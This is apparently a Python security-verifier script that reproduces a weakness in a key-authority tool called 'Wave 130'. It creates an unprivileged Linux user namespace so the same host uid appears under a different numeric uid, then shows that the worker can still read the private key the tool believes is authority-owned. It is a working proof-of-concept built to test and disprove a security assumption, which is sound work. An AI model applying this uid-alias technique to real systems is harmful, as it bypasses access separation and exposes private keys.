#!/usr/bin/env python3
"""Independent Wave 130 verifier: Linux user-namespace UID alias boundary.

NON-CANON / verifier lane only.

Wave 130 compares the process-visible numeric euid with a configured forbidden
worker uid and checks st_uid inside that same namespace. Linux user namespaces
can present one host kernel uid under a different numeric uid. This verifier
asks whether an ordinary worker can create such a namespace, make Wave 130
report a distinct authority uid, while the resulting durable private key is
still owned/readable by the same worker uid in the parent namespace.
"""
from __future__ import annotations

import argparse
import ctypes
import errno
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

CLONE_NEWUSER = 0x10000000
LINUX_CAPABILITY_VERSION_3 = 0x20080522
ENV_UID = "AXM_W130_FORBIDDEN_WORKER_UID"
PRIVATE_KEY = "response_private.pem"
WITNESS_PUBLIC_KEY = "anchor_response_public.pem"


class CapHeader(ctypes.Structure):
    _fields_ = [("version", ctypes.c_uint32), ("pid", ctypes.c_int)]


class CapData(ctypes.Structure):
    _fields_ = [
        ("effective", ctypes.c_uint32),
        ("permitted", ctypes.c_uint32),
        ("inheritable", ctypes.c_uint32),
    ]


def pycmd(*args: str) -> list[str]:
    out = [sys.executable]
    if sys.flags.optimize:
        out.append("-O")
    out.extend(args)
    return out


def status_value(name: str) -> str:
    prefix = name + ":"
    for line in Path("/proc/self/status").read_text().splitlines():
        if line.startswith(prefix):
            return line.split(":", 1)[1].strip()
    return ""


def parse_last_json(text: str) -> dict:
    for line in reversed(text.strip().splitlines()):
        try:
            obj = json.loads(line)
        except Exception:
            continue
        if isinstance(obj, dict):
            return obj
    raise ValueError("missing-json-output")


def write_map(path: str, line: str) -> None:
    Path(path).write_text(line)


def drop_all_caps() -> None:
    libc = ctypes.CDLL(None, use_errno=True)
    header = CapHeader(LINUX_CAPABILITY_VERSION_3, 0)
    data = (CapData * 2)()
    rc = libc.capset(ctypes.byref(header), ctypes.byref(data))
    if rc != 0:
        err = ctypes.get_errno()
        raise OSError(err, "capset-zero-failed")


def child_userns_init(ns_uid: int, anchor_dir: Path, witness_dir: Path,
                      tool: Path, preflight: Path, worker_uid: int) -> int:
    if os.geteuid() != worker_uid:
        print(json.dumps({
            "stage": "pre-unshare",
            "ok": False,
            "error": f"worker-euid-mismatch:{os.geteuid()}!={worker_uid}",
        }, sort_keys=True))
        return 71

    host_uid = os.geteuid()
    host_gid = os.getegid()
    libc = ctypes.CDLL(None, use_errno=True)
    rc = libc.unshare(CLONE_NEWUSER)
    if rc != 0:
        err = ctypes.get_errno()
        print(json.dumps({
            "stage": "unshare",
            "ok": False,
            "errno": err,
            "error": f"{errno.errorcode.get(err, 'ERRNO')}:{os.strerror(err)}",
            "host_uid": host_uid,
            "host_gid": host_gid,
        }, sort_keys=True))
        return 77

    try:
        setgroups = Path("/proc/self/setgroups")
        if setgroups.exists():
            setgroups.write_text("deny\n")
        write_map("/proc/self/uid_map", f"{ns_uid} {host_uid} 1\n")
        write_map("/proc/self/gid_map", f"{ns_uid} {host_gid} 1\n")
        mapped_uid = os.geteuid()
        mapped_gid = os.getegid()
        drop_all_caps()
        before_exec = {
            "stage": "mapped-before-exec",
            "ok": True,
            "parent_host_uid": host_uid,
            "parent_host_gid": host_gid,
            "namespace_euid": mapped_uid,
            "namespace_egid": mapped_gid,
            "uid_map": Path("/proc/self/uid_map").read_text().strip(),
            "gid_map": Path("/proc/self/gid_map").read_text().strip(),
            "cap_eff": status_value("CapEff"),
            "cap_prm": status_value("CapPrm"),
            "no_new_privs": status_value("NoNewPrivs"),
        }
        preflight.write_text(json.dumps(before_exec, indent=2, sort_keys=True) + "\n")
    except BaseException as exc:
        print(json.dumps({
            "stage": "mapping-or-cap-drop",
            "ok": False,
            "error": f"{type(exc).__name__}:{exc}",
        }, sort_keys=True))
        return 78

    env = os.environ.copy()
    env["PYTHONPATH"] = str(tool.parent)
    env["HOME"] = "/tmp"
    env[ENV_UID] = str(worker_uid)
    argv = pycmd(
        str(tool), "init-anchor", str(anchor_dir), str(witness_dir),
        "--anchor-id", "wave130-userns-alias-verifier",
    )
    os.execve(sys.executable, argv, env)
    raise AssertionError("execve-returned")


def derive_public(private_pem: bytes) -> bytes:
    cp = subprocess.run(
        ["openssl", "pkey", "-pubout"],
        input=private_pem,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    if cp.returncode != 0:
        raise RuntimeError("openssl-public-derive-failed:" + cp.stderr.decode("utf-8", "replace"))
    return cp.stdout


def run_attack(worker_uid: int, ns_uid: int, tool: Path, report_path: Path | None) -> int:
    if not sys.platform.startswith("linux"):
        raise RuntimeError("linux-required")
    if os.geteuid() != worker_uid:
        raise PermissionError(
            f"verifier-must-run-as-worker-uid:{os.geteuid()}!={worker_uid}"
        )
    if ns_uid == worker_uid:
        raise ValueError("namespace-uid-must-differ-from-worker-uid")

    base = Path(tempfile.mkdtemp(prefix="axm-w130-userns-verifier-"))
    try:
        witness_dir = base / "witness"
        anchor_dir = base / "anchor"
        preflight = base / "namespace-preflight.json"

        env = os.environ.copy()
        env["PYTHONPATH"] = str(tool.parent)
        env["HOME"] = "/tmp"
        env[ENV_UID] = str(worker_uid)

        init_witness = subprocess.run(
            pycmd(str(tool), "init-witness", str(witness_dir)),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            env=env,
        )

        child = subprocess.run(
            pycmd(
                str(Path(__file__).resolve()),
                "--child-userns-init",
                "--namespace-uid", str(ns_uid),
                "--worker-uid", str(worker_uid),
                "--tool", str(tool),
                "--anchor-dir", str(anchor_dir),
                "--witness-dir", str(witness_dir),
                "--preflight", str(preflight),
            ),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            env=env,
        )

        preflight_obj = {}
        if preflight.exists():
            preflight_obj = json.loads(preflight.read_text())

        init_anchor = {}
        if child.returncode == 0:
            try:
                init_anchor = parse_last_json(child.stdout)
            except Exception as exc:
                init_anchor = {"parse_error": f"{type(exc).__name__}:{exc}"}

        private_path = anchor_dir / PRIVATE_KEY
        public_path = witness_dir / WITNESS_PUBLIC_KEY
        outside_private_owner_uid = None
        outside_private_mode = None
        worker_readable = False
        private_bytes = 0
        derived_public_matches = False
        read_error = None

        if private_path.exists():
            st = private_path.stat()
            outside_private_owner_uid = st.st_uid
            outside_private_mode = oct(stat.S_IMODE(st.st_mode))
            try:
                private = private_path.read_bytes()
                worker_readable = True
                private_bytes = len(private)
                derived_public_matches = (
                    public_path.exists() and derive_public(private) == public_path.read_bytes()
                )
            except BaseException as exc:
                read_error = f"{type(exc).__name__}:{exc}"

        boundary = init_anchor.get("wave130_durable_key_boundary", {})
        cap_eff = str(preflight_obj.get("cap_eff", "")).lower().removeprefix("0x")
        cap_eff_zero = bool(cap_eff) and int(cap_eff, 16) == 0

        reproduced = all([
            init_witness.returncode == 0,
            child.returncode == 0,
            preflight_obj.get("ok") is True,
            preflight_obj.get("namespace_euid") == ns_uid,
            preflight_obj.get("parent_host_uid") == worker_uid,
            cap_eff_zero,
            boundary.get("separate_uid") is True,
            boundary.get("authority_uid") == ns_uid,
            boundary.get("forbidden_worker_uid") == worker_uid,
            boundary.get("private_key_owner_uid") == ns_uid,
            outside_private_owner_uid == worker_uid,
            outside_private_mode == "0o600",
            worker_readable,
            derived_public_matches,
        ])

        report = {
            "schema": "axm.flowing-compute.verifier.wave130-userns-uid-alias.v1",
            "mode": "optimized" if sys.flags.optimize else "normal",
            "attack": "FAIL_USER_NAMESPACE_UID_ALIAS_COLLAPSES_WAVE130_AUTHORITY_BOUNDARY",
            "reproduced": reproduced,
            "worker_parent": {
                "uid": os.geteuid(),
                "gid": os.getegid(),
                "cap_eff": status_value("CapEff"),
                "uid_map": Path("/proc/self/uid_map").read_text().strip(),
            },
            "namespace_preflight": preflight_obj,
            "wave130_init": init_anchor,
            "outside_namespace_observation": {
                "private_key_exists": private_path.exists(),
                "private_key_owner_uid": outside_private_owner_uid,
                "private_key_mode": outside_private_mode,
                "worker_readable": worker_readable,
                "private_bytes": private_bytes,
                "derived_public_matches": derived_public_matches,
                "read_error": read_error,
            },
            "process_results": {
                "init_witness_returncode": init_witness.returncode,
                "init_witness_stderr_tail": init_witness.stderr[-800:],
                "namespace_init_returncode": child.returncode,
                "namespace_init_stdout_tail": child.stdout[-1600:],
                "namespace_init_stderr_tail": child.stderr[-1600:],
            },
            "interpretation": (
                "If reproduced, one host kernel uid created an unprivileged user namespace "
                "where that same credential appeared as a different numeric euid. Wave 130 "
                "accepted the numeric separation and reported the private key as authority-owned "
                "inside the namespace, while the parent worker namespace observed the file as "
                "worker-owned and could read the exact private key. This falsifies treating "
                "namespace-local numeric uid inequality alone as a host-wide authority boundary. "
                "It does not bypass kernels that disable unprivileged user namespaces and does "
                "not claim root/kernel compromise."
            ),
        }
        if report_path:
            report_path.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
        print(json.dumps(report, sort_keys=True))
        return 0 if reproduced else 1
    finally:
        shutil.rmtree(base, ignore_errors=True)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--worker-uid", type=int, default=os.geteuid())
    ap.add_argument("--namespace-uid", type=int, default=23001)
    ap.add_argument("--tool", type=Path, default=Path("/tmp/axm-w130-code/AXM_FLOWING_COMPUTE_PROCESS_WITNESS_KEY_AUTHORITY_BOUNDARY.py"))
    ap.add_argument("--report", type=Path)
    ap.add_argument("--child-userns-init", action="store_true")
    ap.add_argument("--anchor-dir", type=Path)
    ap.add_argument("--witness-dir", type=Path)
    ap.add_argument("--preflight", type=Path)
    args = ap.parse_args()

    if args.child_userns_init:
        if not args.anchor_dir or not args.witness_dir or not args.preflight:
            ap.error("child mode requires --anchor-dir --witness-dir --preflight")
        return child_userns_init(
            args.namespace_uid, args.anchor_dir, args.witness_dir,
            args.tool, args.preflight, args.worker_uid,
        )
    return run_attack(args.worker_uid, args.namespace_uid, args.tool, args.report)


if __name__ == "__main__":
    raise SystemExit(main())
